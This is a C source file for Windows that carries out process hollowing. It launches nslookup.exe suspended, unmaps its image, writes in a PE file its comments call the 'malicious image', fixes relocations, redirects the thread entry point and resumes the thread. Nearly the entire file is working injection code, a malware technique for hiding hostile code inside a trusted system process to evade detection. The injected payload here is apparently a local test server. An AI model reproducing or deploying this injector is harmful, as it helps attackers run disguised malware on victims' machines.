#include<stdio.h>
#include<Windows.h>
#include<winternl.h>
#include<winnt.h>
#pragma comment(lib, "ntdll")

#define BREAK_WITH_ERROR(m) {printf("[-] %s! Error 0x%x", m, GetLastError()); break;}
#define BREAK_WITH_STATUS(m, s) {printf("[-] %s! Error 0x%x", m, s); break;}

typedef struct _UNICODE_STR {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR pBuffer;
} UNICODE_STR, * PUNICODE_STR;

typedef struct _PEB_FREE_BLOCK {
    struct _PEB_FREE_BLOCK* pNext;
    DWORD dwSize;
} PEB_FREE_BLOCK, * PPEB_FREE_BLOCK;

typedef struct __PEB {
    BYTE bInheritedAddressSpace;
    BYTE bReadImageFileExecOptions;
    BYTE bBeingDebugged;
    BYTE bSpareBool;
    LPVOID lpMutant;
    LPVOID lpImageBaseAddress;
    PPEB_LDR_DATA pLdr;
    LPVOID lpProcessParameters;
    LPVOID lpSubSystemData;
    LPVOID lpProcessHeap;
    PRTL_CRITICAL_SECTION pFastPebLock;
    LPVOID lpFastPebLockRoutine;
    LPVOID lpFastPebUnlockRoutine;
    DWORD dwEnvironmentUpdateCount;
    LPVOID lpKernelCallbackTable;
    DWORD dwSystemReserved;
    DWORD dwAtlThunkSListPtr32;
    PPEB_FREE_BLOCK pFreeList;
    DWORD dwTlsExpansionCounter;
    LPVOID lpTlsBitmap;
    DWORD dwTlsBitmapBits[2];
    LPVOID lpReadOnlySharedMemoryBase;
    LPVOID lpReadOnlySharedMemoryHeap;
    LPVOID lpReadOnlyStaticServerData;
    LPVOID lpAnsiCodePageData;
    LPVOID lpOemCodePageData;
    LPVOID lpUnicodeCaseTableData;
    DWORD dwNumberOfProcessors;
    DWORD dwNtGlobalFlag;
    LARGE_INTEGER liCriticalSectionTimeout;
    DWORD dwHeapSegmentReserve;
    DWORD dwHeapSegmentCommit;
    DWORD dwHeapDeCommitTotalFreeThreshold;
    DWORD dwHeapDeCommitFreeBlockThreshold;
    DWORD dwNumberOfHeaps;
    DWORD dwMaximumNumberOfHeaps;
    LPVOID lpProcessHeaps;
    LPVOID lpGdiSharedHandleTable;
    LPVOID lpProcessStarterHelper;
    DWORD dwGdiDCAttributeList;
    LPVOID lpLoaderLock;
    DWORD dwOSMajorVersion;
    DWORD dwOSMinorVersion;
    WORD wOSBuildNumber;
    WORD wOSCSDVersion;
    DWORD dwOSPlatformId;
    DWORD dwImageSubsystem;
    DWORD dwImageSubsystemMajorVersion;
    DWORD dwImageSubsystemMinorVersion;
    DWORD dwImageProcessAffinityMask;
    DWORD dwGdiHandleBuffer[34];
    LPVOID lpPostProcessInitRoutine;
    LPVOID lpTlsExpansionBitmap;
    DWORD dwTlsExpansionBitmapBits[32];
    DWORD dwSessionId;
    ULARGE_INTEGER liAppCompatFlags;
    ULARGE_INTEGER liAppCompatFlagsUser;
    LPVOID lppShimData;
    LPVOID lpAppCompatInfo;
    UNICODE_STR usCSDVersion;
    LPVOID lpActivationContextData;
    LPVOID lpProcessAssemblyStorageMap;
    LPVOID lpSystemDefaultActivationContextData;
    LPVOID lpSystemAssemblyStorageMap;
    DWORD dwMinimumStackCommit;
} _PEB, * _PPEB;

typedef struct BASE_RELOCATION_BLOCK {
    DWORD PageAddress;
    DWORD BlockSize;
} BASE_RELOCATION_BLOCK, * PBASE_RELOCATION_BLOCK;

typedef struct BASE_RELOCATION_ENTRY {
    USHORT Offset : 12;
    USHORT Type : 4;
} BASE_RELOCATION_ENTRY, * PBASE_RELOCATION_ENTRY;

typedef NTSTATUS(NTAPI* pfnNtUnmapViewOfSection)(
    IN HANDLE               ProcessHandle,
    IN PVOID                BaseAddress);

typedef NTSTATUS(NTAPI* pfnNtQueryInformationProcess)(
    IN HANDLE               ProcessHandle,
    IN PROCESSINFOCLASS		ProcessInformationClass,
    OUT PVOID               ProcessInformation,
    IN ULONG                ProcessInformationLength,
    OUT PULONG              ReturnLength);

int main(int argc, const char* argv[]) {
    BOOL returnStatus = 0;
    NTSTATUS status = 0;

    HMODULE hNtdll = NULL;
    pfnNtUnmapViewOfSection pNtUnmapViewOfSection = NULL;
    pfnNtQueryInformationProcess  pNtQueryInformationProcess = NULL;

    STARTUPINFOW si = { sizeof(si) };
    PROCESS_INFORMATION pi = { 0 };

    HANDLE hFile = NULL;
    UINT_PTR rawImage = NULL;
    UINT_PTR imageBase = NULL;

    do {
        // Get APIs address
        if (!(hNtdll = GetModuleHandleW(L"ntdll")))
            BREAK_WITH_ERROR("Failed to get ntdll module");

        if (!(pNtUnmapViewOfSection = (pfnNtUnmapViewOfSection)GetProcAddress(hNtdll, "NtUnmapViewOfSection")))
            BREAK_WITH_ERROR("Failed to get NtUnmapViewOfSection");

        if (!(pNtQueryInformationProcess = (pfnNtQueryInformationProcess)GetProcAddress(hNtdll, "NtQueryInformationProcess")))
            BREAK_WITH_ERROR("Failed to get NtQueryInformationProcess");

        // Create a suspended process
        WCHAR path[] = L"C:\\Windows\\System32\\nslookup.exe";
        if (!CreateProcessW(path, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi))
            BREAK_WITH_ERROR("Failed to create process");

        // Get PEB of target process
        _PEB peb = { 0 };
        ULONG pbiSize = 0;
        PROCESS_BASIC_INFORMATION pbi = { 0 };
        if (!NT_SUCCESS(status = pNtQueryInformationProcess(pi.hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), &pbiSize)))
            BREAK_WITH_STATUS("Failed to retreive process information", status);

        // Read image base of target process
        if (!ReadProcessMemory(pi.hProcess, pbi.PebBaseAddress, &peb, sizeof(peb), NULL))
            BREAK_WITH_ERROR("Failed to read PEB");

        // Unmap main module of target process
        if (!NT_SUCCESS(status = pNtUnmapViewOfSection(pi.hProcess, peb.lpImageBaseAddress)))
            BREAK_WITH_STATUS("Failed to unmap executable module of target process", status);

        // Load malicious image
        WCHAR baseImagePath[] = L"E:\\CTK\\nam5\\PIPE\\win32-named-pipes-example-master\\win32-named-pipes-example-master\\vc12\\x64\\Debug\\server.exe";
        if (INVALID_HANDLE_VALUE == (hFile = CreateFileW(baseImagePath, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL)))
            BREAK_WITH_ERROR("Failed to open file");

        DWORD rawImageSz = GetFileSize(hFile, NULL);
        if (!(rawImage = VirtualAlloc(NULL, rawImageSz, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)))
            BREAK_WITH_ERROR("Failed to allocate local buffer");

        if (!ReadFile(hFile, rawImage, rawImageSz, NULL, NULL))
            BREAK_WITH_ERROR("Failed to read file content");

        // Allocate new memory in target process
        PIMAGE_NT_HEADERS ntHeader = rawImage + ((PIMAGE_DOS_HEADER)rawImage)->e_lfanew;
        if (!(imageBase = VirtualAllocEx(pi.hProcess, peb.lpImageBaseAddress, ntHeader->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE)))
            BREAK_WITH_ERROR("Failed to allocate memory for image");

        // Calculate delta and update image base for malicious image
        UINT_PTR delta = imageBase - ntHeader->OptionalHeader.ImageBase;
        ntHeader->OptionalHeader.ImageBase = imageBase;

        // Write header of malicious image to target process
        if (!WriteProcessMemory(pi.hProcess, imageBase, rawImage, ntHeader->OptionalHeader.SizeOfHeaders, NULL))
            BREAK_WITH_ERROR("Failed to write header");

        // Write sections of malicious image to target process
        PIMAGE_SECTION_HEADER sectionHeader = (UINT_PTR)ntHeader + sizeof(IMAGE_NT_HEADERS);
        for (DWORD i = 0; i < ntHeader->FileHeader.NumberOfSections; i++) {
            UINT_PTR sectionRA = rawImage + sectionHeader[i].PointerToRawData;
            UINT_PTR sectionVA = imageBase + sectionHeader[i].VirtualAddress;
            WriteProcessMemory(pi.hProcess, sectionVA, sectionRA, sectionHeader[i].SizeOfRawData, NULL);
        }

        // Implementing relocation for malicious image in target process
        PIMAGE_DATA_DIRECTORY relocDir = &ntHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
        BYTE relocName[] = ".reloc";
        for (DWORD i = 0; i < ntHeader->FileHeader.NumberOfSections; i++) {
            if (memcmp(sectionHeader[i].Name, relocName, sizeof(relocName)))
                continue;

            DWORD relocOffset = 0;
            while (relocOffset < relocDir->Size) {
                PBASE_RELOCATION_BLOCK relocBlock = rawImage + sectionHeader[i].PointerToRawData + relocOffset;
                PBASE_RELOCATION_ENTRY relocEntry = (INT_PTR)relocBlock + sizeof(BASE_RELOCATION_BLOCK);
                DWORD numRelocEntry = (relocBlock->BlockSize - sizeof(BASE_RELOCATION_BLOCK)) / sizeof(BASE_RELOCATION_ENTRY);
                for (DWORD j = 0; j < numRelocEntry; j++) {
                    if (relocEntry[j].Type == 0)
                        continue;

                    UINT_PTR relocPos = imageBase + relocBlock->PageAddress + relocEntry[j].Offset;
                    UINT_PTR relocPosData = 0;
                    ReadProcessMemory(pi.hProcess, relocPos, &relocPosData, sizeof(relocPosData), NULL);
                    relocPosData += delta;
                    WriteProcessMemory(pi.hProcess, relocPos, &relocPosData, sizeof(relocPosData), NULL);
                }
                relocOffset += relocBlock->BlockSize;
            }
        }

        // Get thread context and update new entry point
        CONTEXT context = { 0 };
        context.ContextFlags = CONTEXT_FULL;
        if (!GetThreadContext(pi.hThread, &context))
            BREAK_WITH_ERROR("Failed to get context");

        context.Rcx = imageBase + ntHeader->OptionalHeader.AddressOfEntryPoint;
        if (!SetThreadContext(pi.hThread, &context))
            BREAK_WITH_ERROR("Failed to set context");

        // Resume thread to run malicious image
        ResumeThread(pi.hThread);
        returnStatus = TRUE;
    } while (0);

    if (INVALID_HANDLE_VALUE != hFile)
        CloseHandle(hFile);

    if (rawImage)
        VirtualFree(rawImage, 0, MEM_RELEASE);

    if (pi.hThread)
        CloseHandle(pi.hThread);

    if (pi.hProcess)
        CloseHandle(pi.hProcess);

    return 0;
}